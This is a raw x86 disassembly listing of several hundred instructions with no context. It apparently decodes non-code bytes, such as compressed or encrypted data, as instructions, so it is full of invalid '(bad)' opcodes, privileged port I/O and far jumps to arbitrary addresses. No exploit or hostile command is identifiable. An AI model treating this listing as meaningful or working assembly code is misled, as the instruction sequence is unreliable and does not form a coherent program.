  41c981:	rcr    BYTE PTR [eax+0x29b771c5],0x34
  41c988:	repz sbb BYTE PTR [ebx-0xb4915d4],bh
  41c98f:	test   edx,eax
  41c991:	ror    BYTE PTR fs:[ecx],cl
  41c994:	push   ds
  41c995:	jmp    0x8960bf57
  41c99a:	jle    0x41c956
  41c99c:	push   edi
  41c99d:	call   0x7f68:0x6c22c1f5
  41c9a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9a5:	cmp    esp,DWORD PTR ds:0xf73c7829
  41c9ab:	push   esp
  41c9ac:	mov    bh,0xe5
  41c9ae:	into   
  41c9af:	sbb    BYTE PTR es:[ebp+0x2580a8c2],ah
  41c9b6:	push   ds
  41c9b7:	imul   edi,ebp,0xffffffb8
  41c9ba:	aad    0x29
  41c9bc:	push   eax
  41c9bd:	inc    edi
  41c9be:	sbb    eax,0x29734bf9
  41c9c3:	pusha  
  41c9c4:	xor    eax,0x3143c20a
  41c9c9:	jns    0x41c976
  41c9cb:	mov    ds:0x8d32e950,al
  41c9d0:	sti    
  41c9d1:	xor    eax,0xadb6052a
  41c9d6:	and    eax,0xd5f20052
  41c9db:	idiv   al
  41c9dd:	popa   
  41c9de:	sub    dl,BYTE PTR [ebx-0xa0e8385]
  41c9e4:	mov    cl,0xea
  41c9e6:	mov    ds:0x6507e6c9,eax
  41c9eb:	push   0x74483c99
  41c9f0:	and    edx,ecx
  41c9f2:	push   ebx
  41c9f3:	sar    DWORD PTR [edx+0x5],0xe2
  41c9f7:	pcmpeqw mm7,QWORD PTR [ebx+0x7b]
  41c9fb:	jns    0x41c9fe
  41c9fd:	das    
  41c9fe:	dec    edi
  41c9ff:	cmp    eax,0xb40638f
  41ca04:	aad    0x19
  41ca06:	cmc    
  41ca07:	leave  
  41ca08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca09:	push   edi
  41ca0a:	jb     0x41c9d8
  41ca0c:	mov    eax,0xa7989a41
  41ca11:	(bad)  
  41ca12:	dec    esi
  41ca13:	push   0x647c322
  41ca18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca19:	mov    bl,0x76
  41ca1b:	mov    ah,0x23
  41ca1d:	rcr    bh,cl
  41ca1f:	mov    edi,0x741dd010
  41ca24:	adc    esp,eax
  41ca26:	int    0x70
  41ca28:	sbb    eax,0x3815d284
  41ca2d:	mov    edi,0x70f6fae6
  41ca32:	push   ebp
  41ca33:	inc    esp
  41ca34:	mov    cs,edx
  41ca36:	mov    ah,0xfc
  41ca38:	sar    BYTE PTR [esi-0x1082b6c3],1
  41ca3e:	sub    eax,0x49df2d41
  41ca43:	clc    
  41ca44:	xchg   ebp,eax
  41ca45:	rcr    DWORD PTR [ecx+0x92fc4f],1
  41ca4b:	mov    dh,0xfb
  41ca4d:	les    ecx,FWORD PTR [edi+ebx*1+0x6c]
  41ca51:	mov    ebx,0xa2439aec
  41ca56:	sbb    eax,0x1aa621cb
  41ca5b:	(bad)  
  41ca5c:	repnz out dx,eax
  41ca5e:	test   ch,bl
  41ca60:	inc    ebx
  41ca61:	rcl    BYTE PTR [ebx],0x2
  41ca64:	jbe    0x41ca2e
  41ca66:	inc    edx
  41ca67:	(bad)  
  41ca68:	int3   
  41ca69:	ficomp WORD PTR [esp+ecx*2-0x4f]
  41ca6d:	aam    0x2
  41ca6f:	and    DWORD PTR [edi+0x6c],esi
  41ca72:	in     eax,dx
  41ca73:	test   al,0x4f
  41ca75:	cmp    esp,DWORD PTR [edx]
  41ca77:	(bad)  
  41ca78:	ficomp DWORD PTR [edi-0x2a]
  41ca7b:	(bad)  
  41ca7c:	push   0xf6b28e2b
  41ca81:	adc    al,0xec
  41ca83:	xchg   edx,eax
  41ca84:	xchg   ebp,eax
  41ca85:	pop    eax
  41ca86:	daa    
  41ca87:	test   DWORD PTR [esi+0x3],ebx
  41ca8a:	test   BYTE PTR [ecx+eiz*2],ah
  41ca8d:	and    BYTE PTR [eax+0x15368369],cl
  41ca93:	aad    0x18
  41ca95:	xor    bl,BYTE PTR [ebx-0x16]
  41ca98:	ins    BYTE PTR es:[edi],dx
  41ca99:	sbb    bh,cl
  41ca9b:	xchg   BYTE PTR [edi+0x26],ch
  41ca9e:	jb     0x41ca64
  41caa0:	hlt    
  41caa1:	ret    
  41caa2:	push   edx
  41caa3:	stc    
  41caa4:	gs leave 
  41caa6:	push   0x4c4e5002
  41caab:	ins    BYTE PTR es:[edi],dx
  41caac:	jno    0x41cac6
  41caae:	mov    ds:0xd4eccb56,al
  41cab3:	jnp    0x41cb2e
  41cab5:	mov    BYTE PTR [edi+0x65],dh
  41cab8:	das    
  41cab9:	cmp    BYTE PTR [edx],bh
  41cabb:	mov    WORD PTR [ecx+edi*4-0x6f5e3c67],?
  41cac2:	rcl    BYTE PTR [esi-0x6c],cl
  41cac5:	push   ebp
  41cac6:	mov    BYTE PTR [edi+0x20f0bb54],al
  41cacc:	dec    esi
  41cacd:	stos   DWORD PTR es:[edi],eax
  41cace:	or     al,0xfd
  41cad0:	adc    ecx,DWORD PTR [esi-0x1e]
  41cad3:	jle    0x41cb2b
  41cad5:	mul    BYTE PTR [ebx]
  41cad7:	dec    edi
  41cad8:	or     BYTE PTR [ebp+0x6],bl
  41cadb:	retf   
  41cadc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cadd:	ror    DWORD PTR [edx],0x98
  41cae0:	or     ecx,DWORD PTR [edx+edx*8-0x4f]
  41cae4:	gs cmc 
  41cae6:	cli    
  41cae7:	sbb    DWORD PTR [esi-0x276a4c85],esi
  41caed:	mov    al,ds:0xf7d357bf
  41caf2:	pushf  
  41caf3:	xor    al,0xb6
  41caf5:	push   ecx
  41caf6:	jecxz  0x41ca80
  41caf8:	pop    ds
  41caf9:	pop    edi
  41cafa:	push   ecx
  41cafb:	adc    esp,DWORD PTR [ecx]
  41cafd:	mov    dh,0x2a
  41caff:	sub    DWORD PTR [ebx-0x76a59b92],eax
  41cb05:	inc    edx
  41cb06:	adc    DWORD PTR [edi],ebp
  41cb08:	(bad)  
  41cb09:	es adc eax,0x24897d28
  41cb10:	or     BYTE PTR [edx+esi*2+0x6b],al
  41cb14:	cmp    ebx,DWORD PTR [ebx+0x2d]
  41cb17:	imul   ebx,DWORD PTR [ebx-0x237800a5],0xffffff9a
  41cb1e:	pop    ebp
  41cb1f:	push   cs
  41cb20:	dec    esi
  41cb21:	ss push ds
  41cb23:	ins    BYTE PTR es:[edi],dx
  41cb24:	or     cl,BYTE PTR [ebp-0x2c36e6ee]
  41cb2a:	in     eax,dx
  41cb2b:	mov    edx,0x58fb5bf1
  41cb30:	(bad)  
  41cb31:	out    dx,al
  41cb32:	jg     0x41cb2f
  41cb34:	rol    DWORD PTR [ebp*1-0x1d94a34d],0x4f
  41cb3c:	aas    
  41cb3d:	int    0x88
  41cb3f:	bswap  eax
  41cb41:	test   DWORD PTR [edx-0x25],edi
  41cb44:	ja     0x41cbc2
  41cb46:	adc    al,0x6c
  41cb48:	inc    esp
  41cb49:	mov    bh,0x5b
  41cb4b:	mov    ch,0x9d
  41cb4d:	inc    edi
  41cb4e:	cs add al,0x5c
  41cb51:	daa    
  41cb52:	stc    
  41cb53:	imul   edx,DWORD PTR [edx+0x2a],0x7f258609
  41cb5a:	in     al,dx
  41cb5b:	jl     0x41cb45
  41cb5d:	jbe    0x41cb28
  41cb5f:	mov    eax,ds:0xdc178ab7
  41cb64:	cmc    
  41cb65:	push   es
  41cb66:	(bad)  
  41cb67:	(bad)  
  41cb68:	ret    
  41cb69:	pop    ss
  41cb6a:	push   cs
  41cb6b:	inc    esp
  41cb6c:	loope  0x41caf4
  41cb6e:	jge    0x41cba2
  41cb70:	out    0xd8,al
  41cb72:	cwde   
  41cb73:	jo     0x41cbb2
  41cb75:	aas    
  41cb76:	fadd   QWORD PTR [esp+ecx*1+0x71]
  41cb7a:	xor    al,0x74
  41cb7c:	sti    
  41cb7d:	loope  0x41cbdf
  41cb7f:	add    BYTE PTR [ebx-0x5c],0xf3
  41cb83:	rcl    esi,cl
  41cb85:	stos   BYTE PTR es:[edi],al
  41cb86:	ret    
  41cb87:	sti    
  41cb88:	jae    0x41cba7
  41cb8a:	jne    0x41cbb2
  41cb8c:	leave  
  41cb8d:	sahf   
  41cb8e:	pusha  
  41cb8f:	or     eax,0xd13e3a18
  41cb94:	xor    esi,DWORD PTR [ebx+0x5cb9772c]
  41cb9a:	sbb    DWORD PTR [edx],esp
  41cb9c:	popa   
  41cb9d:	imul   ebx,DWORD PTR [esi-0x46],0x65b8581f
  41cba4:	icebp  
  41cba5:	jge    0x41cb8b
  41cba7:	ja     0x41cc16
  41cba9:	cmc    
  41cbaa:	mov    edx,ebx
  41cbac:	jmp    0xc85cbabc
  41cbb1:	mov    bh,0x6e
  41cbb3:	mov    al,BYTE PTR ds:0x9b974f14
  41cbb9:	iret   
  41cbba:	cmp    al,0xc3
  41cbbc:	push   esp
  41cbbd:	into   
  41cbbe:	cmp    al,0x9f
  41cbc0:	rol    BYTE PTR ds:0xd556a143,cl
  41cbc6:	cmp    ah,BYTE PTR [edi+0x5d097aab]
  41cbcc:	fisttp QWORD PTR [ebx]
  41cbce:	jmp    0x41cc02
  41cbd0:	test   eax,0x7a2e665a
  41cbd5:	inc    ebp
  41cbd6:	std    
  41cbd7:	add    eax,0x7231fe2e
  41cbdc:	sub    eax,0x811362f1
  41cbe1:	pop    esi
  41cbe2:	push   ebp
  41cbe3:	lods   al,BYTE PTR ds:[esi]
  41cbe4:	fbstp  TBYTE PTR [edx+ecx*1+0x3a003570]
  41cbeb:	sub    DWORD PTR [edi],eax
  41cbed:	inc    ebp
  41cbee:	call   0x1441:0xf814175b
  41cbf5:	lea    ebx,[ecx+ebp*2+0x2e]
  41cbf9:	aaa    
  41cbfa:	mov    eax,0x5bddd9d
  41cbff:	fcmovnbe st,st(3)
  41cc01:	clc    
  41cc02:	sbb    BYTE PTR [esp+ebx*8-0x64],ch
  41cc06:	lock loopne 0x41cc1c
  41cc09:	rcl    BYTE PTR [ecx-0x5],0x45
  41cc0d:	xor    cl,BYTE PTR [esp+eax*4+0x71]
  41cc11:	sbb    edx,ebx
  41cc13:	dec    esp
  41cc14:	cmp    eax,ebp
  41cc16:	dec    ebx
  41cc17:	cld    
  41cc18:	sbb    dh,BYTE PTR [ebp+0x66bb6d50]
  41cc1e:	or     ch,al
  41cc20:	pop    edi
  41cc21:	retf   0x65c5
  41cc24:	and    ecx,ecx
  41cc26:	js     0x41cc77
  41cc28:	das    
  41cc29:	inc    eax
  41cc2a:	in     al,dx
  41cc2b:	or     eax,0x16c5f436
  41cc30:	or     al,0xa6
  41cc32:	and    dl,BYTE PTR [ecx+edi*4]
  41cc35:	xchg   ecx,eax
  41cc36:	add    al,0x13
  41cc38:	scas   al,BYTE PTR es:[edi]
  41cc39:	ja     0x41cc11
  41cc3b:	mov    WORD PTR [edx-0x3ed29797],fs
  41cc41:	pop    edx
  41cc42:	or     al,0x18
  41cc44:	pop    esi
  41cc45:	std    
  41cc46:	mov    WORD PTR [ebp-0x3ce9bd83],fs
  41cc4c:	out    dx,al
  41cc4d:	mov    edx,0xb0cf3c00
  41cc52:	scas   eax,DWORD PTR es:[edi]
  41cc53:	in     eax,0x94
  41cc55:	(bad)  
  41cc56:	pop    edx
  41cc57:	leave  
  41cc58:	cmp    ch,al
  41cc5a:	mov    DWORD PTR [ebp-0x46a926f6],ebx
  41cc60:	and    al,0xda
  41cc62:	aam    0x63
  41cc64:	out    dx,eax
  41cc65:	adc    cl,0x62
  41cc68:	rcr    eax,1
  41cc6a:	adc    ch,0x9f
  41cc6d:	mov    esp,0x3613364f
  41cc72:	sub    cl,ah
  41cc74:	int3   
  41cc75:	fs jae 0x41cc36
  41cc78:	push   ss
  41cc79:	(bad)  
  41cc7a:	into   
  41cc7b:	sub    DWORD PTR [ecx+0x4b9fecea],eax
  41cc81:	ret    0xb608
  41cc84:	pop    eax
  41cc85:	pop    edi
  41cc86:	(bad)  
  41cc87:	stc    
  41cc88:	pop    esp
  41cc89:	lods   eax,DWORD PTR ds:[esi]
  41cc8a:	or     ecx,0xee7ad0ea
  41cc90:	mov    al,0x93
  41cc92:	ja     0x41cce4
  41cc94:	mov    esp,0x217d0f30
  41cc99:	sub    BYTE PTR [ebp-0x51193745],al
  41cc9f:	mov    esp,0xff8ad304
  41cca4:	je     0x41cd1c
  41cca6:	fs aam 0xbb
  41cca9:	or     ax,0xacfe
  41ccad:	adc    bl,dl
  41ccaf:	push   0xdc43366
  41ccb4:	jmp    0x41cce3
  41ccb6:	adc    DWORD PTR [ebx],0x7f
  41ccb9:	fs push ss
  41ccbb:	xor    bl,bl
  41ccbd:	leave  
  41ccbe:	ror    DWORD PTR [ebx+0x1],cl
  41ccc1:	push   esi
  41ccc2:	ins    BYTE PTR es:[edi],dx
  41ccc3:	or     DWORD PTR [edx],edi
  41ccc5:	sub    esi,ebx
  41ccc7:	aas    
  41ccc8:	jo     0x41cc6f
  41ccca:	add    DWORD PTR [edi],0x81b2569d
  41ccd0:	xchg   ecx,eax
  41ccd1:	jo     0x41cc7f
  41ccd3:	sahf   
  41ccd4:	rcr    DWORD PTR [ebp+0x6b760127],1
  41ccda:	push   eax
  41ccdb:	mov    BYTE PTR [edi+0x43e4077e],cl
  41cce1:	test   BYTE PTR [edi],0x6
  41cce4:	and    DWORD PTR [ebx-0x380fd61],eax
  41ccea:	or     bl,BYTE PTR [edi-0x76b14386]
  41ccf0:	jmp    0xb019:0xc384c2f7
  41ccf7:	sub    ebp,DWORD PTR [edx+0x73]
  41ccfa:	je     0x41cc83
  41ccfc:	dec    esp
  41ccfd:	mov    dh,0x94
  41ccff:	mov    ss,WORD PTR [ecx+0x6456f6e0]
  41cd05:	mov    ch,0xc6
  41cd07:	es inc ebx
  41cd09:	mov    al,0x91
  41cd0b:	mov    bl,0xde
  41cd0d:	scas   eax,DWORD PTR es:[edi]
  41cd0e:	inc    ebx
  41cd0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd10:	sbb    al,0xa3
  41cd12:	stc    
  41cd13:	leave  
  41cd14:	inc    edx
  41cd15:	arpl   bx,di
  41cd17:	mov    eax,DWORD PTR ds:0x104711dd
  41cd1d:	(bad)  
  41cd1e:	jb     0x41cd0b
  41cd20:	arpl   WORD PTR [ecx-0x3f],sp
  41cd23:	int    0xef
  41cd25:	mov    ecx,0xef589f32
  41cd2a:	cs retf 
  41cd2c:	nop
  41cd2d:	push   ecx
  41cd2e:	rcl    DWORD PTR [ebp+0x20],cl
  41cd31:	fucom  st(2)
  41cd33:	push   cs
  41cd34:	push   ebx
  41cd35:	mov    ebx,0xb0e36e61
  41cd3a:	dec    eax
  41cd3b:	mov    al,0xd3
  41cd3d:	adc    ebx,esp
  41cd3f:	sub    BYTE PTR ds:0xb75f81c6,ch
  41cd45:	cld    
  41cd46:	test   al,0xb7
  41cd48:	dec    ecx
  41cd49:	inc    esp
  41cd4a:	sar    DWORD PTR [esi-0x23],0xc2
  41cd4e:	push   edx
  41cd4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd50:	or     edx,esi
  41cd52:	loope  0x41cce5
  41cd54:	xchg   BYTE PTR [edx-0x1d],ah
  41cd57:	retf   
  41cd58:	scas   eax,DWORD PTR es:[edi]
  41cd59:	retf   
  41cd5a:	ret    
  41cd5b:	jmp    0xbdc0:0xd15dd221
  41cd62:	and    eax,0x9c67475e
  41cd67:	ins    BYTE PTR es:[edi],dx
  41cd68:	lds    ebx,FWORD PTR [eax+eiz*8-0x4625d8ce]
  41cd6f:	cmc    
  41cd70:	mov    ebp,es
  41cd72:	xor    al,dl
  41cd74:	ret    
  41cd75:	int    0x23
  41cd77:	and    BYTE PTR [ebx+0x7a],0x4
  41cd7b:	dec    eax
  41cd7c:	and    eax,0x61e68013
  41cd81:	pop    ecx
  41cd82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd83:	add    DWORD PTR [esi-0x7],edi
  41cd86:	(bad)  
  41cd87:	imul   BYTE PTR [ebx+edx*8+0x37]
  41cd8b:	ja     0x41cd34
  41cd8d:	ret    0x2a39
  41cd90:	pusha  
  41cd91:	xchg   ecx,eax
  41cd92:	test   al,0xe7
  41cd94:	adc    BYTE PTR [ebx-0x6e],ah
  41cd97:	loope  0x41cdec
  41cd99:	dec    eax
  41cd9a:	js     0x41cd95
  41cd9c:	xor    ebp,ebx
  41cd9e:	les    ebp,FWORD PTR [ebp-0x2be6b6b5]
  41cda4:	xor    DWORD PTR [edi+0x596f2bed],ecx
  41cdaa:	(bad)  
  41cdab:	int3   
  41cdac:	mov    al,ds:0x6c47b106
  41cdb1:	adc    bh,ch
  41cdb3:	mov    cl,0x14
  41cdb5:	mov    fs,WORD PTR [ebp+eax*4+0x411eb00c]
  41cdbc:	mov    esp,0x5c173e21
  41cdc1:	xchg   edi,eax
  41cdc2:	xor    eax,0x2d9f2c5
  41cdc7:	test   BYTE PTR [edx-0x5ca0d931],dh
  41cdcd:	lods   eax,DWORD PTR ds:[esi]
  41cdce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdcf:	xlat   BYTE PTR ds:[ebx]
  41cdd0:	xchg   dl,dl
  41cdd2:	sbb    edx,edx
  41cdd4:	mov    ds:0x9951774,al
  41cdd9:	jno    0x41cd8a
  41cddb:	or     dl,cl
  41cddd:	(bad)  
  41cdde:	mov    DWORD PTR [esi+0x27],ecx
  41cde1:	out    dx,eax
  41cde2:	sti    
  41cde3:	rol    ah,0x3f
  41cde6:	pop    eax
  41cde7:	push   edi
  41cde8:	sar    DWORD PTR [eax],1
  41cdea:	sbb    dl,BYTE PTR [edx+edx*4+0x4d4d22c5]
  41cdf1:	jp     0x41ce0c
  41cdf3:	(bad)  
  41cdf4:	push   ebx
  41cdf5:	add    al,0xe4
  41cdf7:	adc    al,0x2a
  41cdf9:	shl    DWORD PTR [edi],0x19
  41cdfc:	jae    0x41ce68
  41cdfe:	mov    WORD PTR [edx-0x42],?
  41ce01:	test   ch,dh
  41ce03:	outs   dx,BYTE PTR ds:[esi]
  41ce04:	in     eax,0xe2
  41ce06:	out    dx,al
  41ce07:	sbb    al,0x87
  41ce09:	and    BYTE PTR [esi-0x7a15368a],0x99
  41ce10:	xor    cl,bl
  41ce12:	xchg   ebx,eax
  41ce13:	ja     0x41ce1d
  41ce15:	cdq    
  41ce16:	mov    WORD PTR [edi-0x31],?
  41ce19:	jp     0x41cdda
  41ce1b:	mov    bl,0xda
  41ce1d:	adc    DWORD PTR [edx+edx*2+0x1a],0x62
  41ce22:	push   ss
  41ce23:	lea    eax,[ecx+0x3c]
  41ce26:	or     ebx,DWORD PTR [edi-0x80]
  41ce29:	mov    eax,0x8ce37080
  41ce2e:	mov    ebx,0x4ec34268
  41ce34:	xor    eax,0xac004298
  41ce39:	mov    ah,0x71
  41ce3b:	xchg   esp,eax
  41ce3c:	lods   al,BYTE PTR ds:[esi]
  41ce3d:	aam    0x85
  41ce3f:	xchg   ebp,eax
  41ce40:	leave  
  41ce41:	and    DWORD PTR [esi-0x283e010f],0xffffffe6
  41ce48:	sahf   
  41ce49:	mov    esi,0x21e37cbe
  41ce4e:	daa    
  41ce4f:	xor    DWORD PTR [eax-0x8],esi
  41ce52:	cli    
  41ce53:	xor    di,WORD PTR [ebx]
  41ce56:	jbe    0x41ce47
  41ce58:	dec    esi
  41ce59:	push   eax
  41ce5a:	idiv   edx
  41ce5c:	stos   DWORD PTR es:[edi],eax
  41ce5d:	jno    0x41ce91
  41ce5f:	out    0x5a,eax
  41ce61:	lahf   
  41ce62:	inc    ebp
  41ce63:	pop    ecx
  41ce64:	stos   BYTE PTR es:[edi],al
  41ce65:	pop    ebx
  41ce66:	imul   esi,DWORD PTR [ebx+0x3c],0x68
  41ce6a:	mul    DWORD PTR [ebx-0x23]
  41ce6d:	cmp    al,BYTE PTR [ebx]
  41ce6f:	stc    
  41ce70:	call   0x2066:0x370cd1aa
  41ce77:	and    cl,bl
  41ce79:	dec    edi
  41ce7a:	loopne 0x41ce41
  41ce7c:	xlat   BYTE PTR ds:[ebx]
  41ce7d:	adc    DWORD PTR [ebp-0x46c4f248],edx
  41ce83:	push   ss
  41ce84:	jl     0x41ce43
  41ce86:	repz call 0x6c3c9e37
  41ce8c:	lock push ebx
  41ce8e:	xor    eax,0x4ec83754
  41ce93:	pop    ebx
  41ce94:	ss pushf 
  41ce96:	sub    al,0x39
  41ce98:	jbe    0x41cf09
  41ce9a:	aad    0xec
  41ce9c:	fcmovb st,st(6)
  41ce9e:	dec    esi
  41ce9f:	or     ch,bl
  41cea1:	dec    ecx
  41cea2:	pop    ecx
  41cea3:	outs   dx,BYTE PTR ds:[esi]
  41cea4:	mov    esi,0x690eef72
  41cea9:	xor    BYTE PTR [edx-0x4fde7a8a],dh
  41ceaf:	or     eax,0x89eaed82
  41ceb4:	and    dl,BYTE PTR [ebp-0x4]
  41ceb7:	outs   dx,BYTE PTR ds:[esi]
  41ceb8:	xchg   edi,eax
  41ceb9:	xchg   ecx,eax
  41ceba:	mov    eax,ds:0x66d348ad
  41cebf:	enter  0x61,0x7e
  41cec3:	popf   
  41cec4:	inc    esi
  41cec5:	dec    ebp
  41cec6:	inc    edx
  41cec7:	jne    0x41cf48
  41cec9:	add    eax,0x43ee10a3
  41cece:	xor    DWORD PTR [ebx-0x13],esi
  41ced1:	loop   0x41cea9
  41ced3:	lea    edi,ds:0x9f8bf8db
  41ced9:	pop    ebx
  41ceda:	xchg   ecx,eax
  41cedb:	das    
  41cedc:	pop    ss
  41cedd:	xchg   esp,eax
  41cede:	jnp    0x41cf19
  41cee0:	aad    0x34
  41cee2:	mov    dl,0x1c
  41cee4:	loopne 0x41cf2d
  41cee6:	adc    cl,BYTE PTR [ecx+0x6adaaf43]
  41ceec:	mov    bh,0x48
  41ceee:	test   eax,0xc6e1e550
  41cef3:	pushf  
  41cef4:	sbb    ecx,DWORD PTR [ebx-0x2c9bfffd]
  41cefa:	test   DWORD PTR [ecx+0x6dec531d],ebp
  41cf00:	sub    DWORD PTR [ebx-0x54],esp
  41cf03:	lahf   
  41cf04:	div    DWORD PTR [ecx]
  41cf06:	retf   0x7c48
  41cf09:	adc    eax,0x7ad7ac20
  41cf0e:	call   0x1c365149
  41cf13:	jle    0x41cf53
  41cf15:	cmp    BYTE PTR [ebp-0x6c],dh
  41cf18:	dec    edx
  41cf19:	xor    eax,DWORD PTR [edi]
  41cf1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf1c:	push   ecx
  41cf1d:	push   es
  41cf1e:	pop    edx
  41cf1f:	inc    ebp
  41cf20:	dec    esi
  41cf21:	add    eax,0x2c66d618
  41cf26:	aas    
  41cf27:	jecxz  0x41cebe
  41cf29:	adc    edx,esi
  41cf2b:	jmp    0x5553:0x596af967
  41cf32:	iret   
  41cf33:	mov    dl,0xc1
  41cf35:	je     0x41cf6f
  41cf37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf38:	sbb    ebx,DWORD PTR [eax-0x6d2cff42]
  41cf3e:	xchg   esp,eax
  41cf3f:	mov    bl,0xe2
  41cf41:	icebp  
  41cf42:	pop    ebp
  41cf43:	mov    ah,0x69
  41cf45:	call   0x1432f47c
  41cf4a:	in     al,0xa9
  41cf4c:	xor    BYTE PTR [edi-0x16],cl
  41cf4f:	retf   0x7e03
  41cf52:	in     eax,0x42
  41cf54:	test   eax,0xd3dedd1b
  41cf59:	mov    WORD PTR [esi],gs
  41cf5b:	sbb    dh,BYTE PTR [edx+0x66d32fa2]
  41cf61:	inc    eax
  41cf62:	xor    BYTE PTR [ebx-0x6a6e7522],ch
  41cf68:	(bad)  
  41cf69:	jae    0x41cfc0
  41cf6b:	aam    0x31
  41cf6d:	ret    0xfb16
  41cf70:	xor    al,0x8c
  41cf72:	fnstenv ds:0xccbd8830
  41cf78:	or     esp,ebx
  41cf7a:	push   ebx
  41cf7b:	iret   
  41cf7c:	mov    ah,0xef
  41cf7e:	test   dh,ch
  41cf80:	jmp    0xcc791199
  41cf85:	mov    dh,0xda
  41cf87:	(bad)  
  41cf88:	into   
  41cf89:	push   esp
  41cf8a:	nop
  41cf8b:	add    DWORD PTR [edi-0x17a8a164],edi
  41cf91:	xchg   ebx,eax
  41cf92:	ret    0xad3d
  41cf95:	mov    es,WORD PTR [ebp-0x7b906d32]
  41cf9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf9c:	(bad)  
  41cf9d:	cdq    
  41cf9e:	xchg   edx,eax
  41cf9f:	add    edi,esi
  41cfa1:	jae    0x41cf9d
  41cfa3:	dec    ecx
  41cfa4:	ins    BYTE PTR es:[edi],dx
  41cfa5:	imul   DWORD PTR [edx]
  41cfa7:	or     eax,0x3f4cf5
  41cfac:	and    DWORD PTR [edx-0x1e4a4404],esi
  41cfb2:	fdiv   DWORD PTR [ecx]
  41cfb4:	test   eax,0x8a4f60af
  41cfb9:	leave  
  41cfba:	sbb    esp,ebx
  41cfbc:	fldenv [edx]
  41cfbe:	mov    WORD PTR [esi+ecx*2],ss
  41cfc1:	mov    edx,0xa0228f7d
  41cfc6:	jnp    0x41cfe4
  41cfc8:	repnz nop
  41cfca:	and    BYTE PTR [eax-0x64],0x5
  41cfce:	pop    edi
  41cfcf:	in     eax,0x33
  41cfd1:	mov    DWORD PTR [edi+0x73],ecx
  41cfd4:	mov    al,BYTE PTR [edx+0x5687fef8]
  41cfda:	mov    bl,0x3e
  41cfdc:	mov    al,0xc8
  41cfde:	pop    ecx
  41cfdf:	mov    edi,0x51457808
  41cfe4:	jns    0x41cf8d
  41cfe6:	popa   
  41cfe7:	sub    edx,DWORD PTR [ebp+0x39]
  41cfea:	sub    DWORD PTR [edx-0x204d1e93],edx
  41cff0:	xlat   BYTE PTR ds:[ebx]
  41cff1:	(bad)  
  41cff2:	retf   0x8f9b
  41cff5:	js     0x41d050
  41cff7:	ret    0xdac
  41cffa:	xor    BYTE PTR ds:0xc48530af,bl
  41d000:	inc    esi
  41d001:	jb     0x41d065
  41d003:	(bad)  
  41d004:	out    dx,eax
  41d005:	add    al,0x78
  41d007:	cs jge 0x41cf90
  41d00a:	lahf   
  41d00b:	sbb    eax,0x97b08f90
  41d010:	xor    BYTE PTR [eax],0x33
  41d013:	adc    BYTE PTR [eax+ecx*4-0x63d8fd6a],al
  41d01a:	in     al,0xac
  41d01c:	popa   
  41d01d:	loop   0x41d035
  41d01f:	add    bh,bh
  41d021:	ds inc esi
  41d023:	shl    DWORD PTR [edi-0x7978274a],0xe2
  41d02a:	mov    bh,BYTE PTR [ecx+0x4917cc2f]
  41d030:	pop    ebp
  41d031:	jnp    0x41d00d
  41d033:	sbb    ch,BYTE PTR [edi]
  41d035:	pop    ss
  41d036:	dec    eax
  41d037:	or     ebp,DWORD PTR [ebp-0x18]
  41d03a:	pop    ds
  41d03b:	fsub   QWORD PTR [ebp-0x40e922ce]
  41d041:	and    bh,BYTE PTR [ebx]
  41d043:	lods   eax,DWORD PTR ds:[esi]
  41d044:	mov    esp,0x6464d946
  41d049:	push   esi
  41d04a:	popa   
  41d04b:	enter  0x8e3b,0xc7
  41d04f:	inc    ebx
  41d050:	aam    0x20
  41d052:	xor    ecx,ebp
  41d054:	cmp    DWORD PTR [edx],0xffffffce
  41d057:	and    dh,bh
  41d059:	test   DWORD PTR [eax],esi
  41d05b:	sbb    eax,0x2706f6dd
  41d060:	ds ds xchg esi,eax
  41d063:	or     al,0x1b
  41d065:	sbb    eax,0x48b937b6
  41d06a:	push   ds
  41d06b:	mov    WORD PTR [bp+0x1dc8],cs
  41d070:	cmp    al,BYTE PTR [edi+edx*1+0x72]
  41d074:	sub    BYTE PTR [esp+esi*1-0x4d],0x14
  41d079:	js     0x41d043
  41d07b:	push   cs
  41d07c:	cmp    eax,0x3f26fcba
  41d081:	stos   DWORD PTR es:[edi],eax
  41d082:	repz aaa 
  41d084:	xchg   edi,eax
  41d085:	mov    edx,edi
  41d087:	int3   
  41d088:	add    ch,al
  41d08a:	and    al,0x3b
  41d08c:	jl     0x41d05b
  41d08e:	adc    DWORD PTR [ebx-0x2264206d],0xffffffed
  41d095:	jmp    0x41d109
  41d097:	jae    0x41d04b
  41d099:	(bad)  
  41d09a:	jbe    0x41d03e
  41d09c:	mov    ebp,DWORD PTR [ebp-0x7cefb91]
  41d0a2:	hlt    
  41d0a3:	pop    ss
  41d0a4:	lods   eax,DWORD PTR ds:[esi]
  41d0a5:	sahf   
  41d0a6:	mov    bl,0xe
  41d0a8:	or     bh,ch
  41d0aa:	pop    edx
  41d0ab:	adc    BYTE PTR [ecx+edi*8+0x45],cl
  41d0af:	stos   DWORD PTR es:[edi],eax
  41d0b0:	sbb    DWORD PTR [eax+0xe44ab7b],0x4821e26b
  41d0ba:	in     eax,0x4d
  41d0bc:	and    BYTE PTR [esi],cl
  41d0be:	add    ecx,esi
  41d0c0:	jns    0x41d084
  41d0c2:	xor    al,0x44
  41d0c4:	fsub   DWORD PTR [eax+0x43a49f09]
  41d0ca:	push   ds
  41d0cb:	xchg   ebp,eax
  41d0cc:	cmp    eax,0x5b887786
  41d0d1:	js     0x41d064
  41d0d3:	ins    DWORD PTR es:[edi],dx
  41d0d4:	inc    edi
  41d0d5:	fstp   TBYTE PTR [esi-0x4c]
  41d0d8:	cli    
  41d0d9:	mov    al,ds:0xccc0eb5d
  41d0de:	push   ebp
  41d0df:	jge    0x41d12f
  41d0e1:	inc    esi
  41d0e2:	pop    ds
  41d0e3:	stc    
  41d0e4:	push   edx
  41d0e5:	das    
